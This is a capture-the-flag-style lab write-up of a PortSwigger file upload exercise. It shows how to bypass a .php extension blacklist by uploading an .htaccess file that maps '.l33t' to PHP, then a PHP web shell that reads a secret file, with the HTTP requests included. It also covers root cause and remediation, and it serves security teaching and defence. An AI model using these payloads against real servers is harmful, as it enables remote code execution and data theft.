# Lab 04 — Web Shell Upload via Extension Blacklist Bypass

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20Blacklist%20Bypass%20via%20Server%20Config%20File-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Web Shell Upload via Extension Blacklist Bypass |
| **Difficulty** | Practitioner |
| **Vulnerability Class** | File Upload — Blacklist Bypass via Server Config File |
| **Weakness (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The server blacklists the `.php` extension, but doesn't account for Apache configuration files. By uploading a custom `.htaccess` that registers an arbitrary, non-blacklisted extension as a PHP handler (`mod_php`), an attacker can then upload a web shell using that custom extension and have Apache execute it as PHP.

## 3. Proof of Concept (PoC)

**Step 1 — Confirm the blacklist:**  
Attempt to upload `exploit.php` — the response states `.php` files are not allowed. Note from response headers that the server is Apache.

**Step 2 — Craft a malicious .htaccess file:**  
In the same Burp Repeater request used for the upload, change the filename to `.htaccess`, set `Content-Type: text/plain`, and replace the body content with:

```apache
AddType application/x-httpd-php .l33t
```

**Step 3 — Upload the .htaccess file:**  
Send the request — the response confirms successful upload.

**Step 4 — Re-upload the shell with the new extension:**  
Go back to the original PHP exploit request and change the filename from `exploit.php` to `exploit.l33t`. Send it — upload succeeds, since `.l33t` was never blacklisted.

**Step 5 — Trigger the shell:**  
Request `GET /files/avatars/exploit.l33t` — thanks to the malicious `.htaccess`, the server executes it as PHP and returns Carlos's secret.


## 4. Evidence (Request / Response)

```http
POST /my-account/avatar HTTP/1.1
[... filename=".htaccess", Content-Type: text/plain ...]
AddType application/x-httpd-php .l33t

POST /my-account/avatar HTTP/1.1
[... filename="exploit.l33t" ...]
<?php echo file_get_contents('/home/carlos/secret'); ?>

GET /files/avatars/exploit.l33t HTTP/1.1

HTTP/1.1 200 OK
<secret-value-here>
```

## 5. Root Cause Analysis

The extension blacklist only accounts for commonly dangerous extensions but does not account for Apache configuration files (`.htaccess`), which can themselves redefine which extensions the server treats as executable. This lets an attacker bootstrap execution for an arbitrary extension of their own choosing — one the blacklist was never designed to cover.

### Attacker vs. Defender Perspective

- **Attacker view:** When a blacklist only blocks the obvious extensions, look for ways to upload a config file (.htaccess, web.config) that redefines which extension the server executes as a script.
- **Defender view:** Disable per-directory config file overrides in any upload directory, and never rely on a blacklist for dangerous extensions.

## 6. Impact

Full remote code execution via a web shell, bypassing an extension blacklist entirely by attacking the web server's own configuration mechanism rather than the blacklist logic itself.

## 7. Remediation

- Validate extensions against a strict allow-list, never a blacklist.
- Disable per-directory config file overrides (`AllowOverride None` in Apache) in any upload directory.
- Store uploads outside the web root, or in a location configured to never execute scripts regardless of extension or local config files.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
